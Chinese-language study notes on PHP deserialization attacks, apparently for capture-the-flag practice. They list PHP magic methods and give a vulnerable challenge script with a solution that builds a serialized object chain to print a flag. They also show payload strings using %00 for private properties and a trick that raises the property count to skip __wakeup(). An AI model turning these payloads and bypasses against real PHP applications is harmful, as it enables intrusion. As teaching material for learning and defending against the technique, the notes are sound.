文章：<https://www.freebuf.com/articles/web/264740.html>
## **php执行序列化**


用php执行序列化，看序列化后什么样子
```
class CDU{
    public $Student_ID='114514';public $name='xiaoming';public $key=false;
    public function check_key(){
        return $this->key;}

    public function check($id,$name){
        if ($this->Student_ID===$id&&$this->name===$name){
        system('tac hint.php');return true;}else{
    return false;}
    }
}

$user = new CDU();
echo serialize($user);//序列化


//漏洞处，反序列化
$user1 = unserialize( serialize($user); );
```
序列化前可以操作对象赋值
```
class BUU {
    public $correct = "";
    public $input = "";

    public function __destruct() {
        try {
            $this->correct = base64_encode(uniqid());
            if($this->correct === $this->input) {
                echo file_get_contents("/flag");
            }
        } catch (Exception $e) {
        }
    }
}
$user = new BUU();
$user->input = &$user->correct;//赋值以满足条件，这里赋值地址指向。
echo serialize($user);
```



^
## **魔术方法调用**

序列化和反序列化时的魔术方法调用
```
__wakeup()    对象被反序列化时调用。
__construct()    实例对象时调用。



__destruct()    对象被显式销毁是执行，反序列化后，程序结束前执行。
__sleep()    对象被序列化时调用
__tostring()    echo $对象 时调用


魔术方法：
 __construct()            //类的构造函数，创建对象时触发，如new A。或new A()。
通过反序列化产生的对象并不会调用__construct函数。

 __destruct()             //类的析构函数，对象被销毁时触发
__call()                 //在对象上下文中调用不可访问的方法时触发
__callStatic()           //在静态上下文中调用不可访问的方法时触发
__get()                  //读取不可访问属性的值时触发，
这里的不可访问包含私有属性或未定义，不可访问的属性中读取数据会触发（访问类中一个不存在的属性时也自动调用）。

public function __get($name){  $this->except[$name]; }  //$name为不可访问的属性名
如果public $except=array("index"=>"upload_img");，$name为index则还会触发upload_img()方法。


public function __call($name, $arguments) { $this->{$name} ;}  
//$name为不可访问的方法名 ,这里方法里的$this->{$name}，意味着调用一个同名的不可访问方法名字的属性


__set()                  //在给不可访问属性赋值时触发
__isset()                //当对不可访问属性调用 isset() 或 empty() 时触发
__unset()                //在不可访问的属性上使用unset()时触发
__invoke()               //当尝试以调用函数的方式调用一个对象时触发，如new A()时。
__sleep()                //执行serialize()时，先会调用这个方法
__wakeup()               //执行unserialize()时，先会调用这个方法
__toString()             //当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用
```
代码审计搜索：
unserialize


## **列题**
```
<?php
include "flag.php";
highlight_file(__FILE__);

class Moon{
    public $name="月亮";
    public function __toString(){
        return $this->name;
    }
    
    public function __wakeup(){
        echo "我是".$this->name."快来赏我";
    }
}

class Ion_Fan_Princess{
    public $nickname="牛夫人";

    public function call(){
        global $flag;
        if ($this->nickname=="小甜甜"){
            echo $flag;
        }else{
            echo "以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家".$this->nickname."。\n";
            echo "你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n";
        }
    }
    
    public function __toString(){
        $this->call();
        return "\t\t\t\t\t\t\t\t\t\t----".$this->nickname;
    }
}

if (isset($_GET['code'])){
    unserialize($_GET['code']);

}else{
    $a=new Ion_Fan_Princess();
    echo $a;
}
```
题解
```
<?php
class Moon{
    public $name="月亮";
}

class Ion_Fan_Princess{
    public $nickname="牛夫人";
}

	$a = new Moon;
	$b = new Ion_Fan_Princess;
	$b->nickname = "小甜甜";
	$a->name=$b;
   
	echo serialize($a);
?>
```

在线php运行：<https://www.jyshare.com/compile/1/>

^
private私有属性的反序列化，需要替换字符
```
O:4:"Name":2:{s:14:"口Name口username";s:6:"admine";s:14:"口Name口password";s:3:"100";}
会有口，改为%00
O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
```
反序列化时绕过__wakeup()方法执行
```
O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
改为
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
让属性数量大于真实数量3>2
```
^
protected类型的属性，反序列化也存在不可打印字符。
但对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。
如果低于7.1版本，在反序列化的时候进行url编码，防止有不可打印字符，正好也get参数。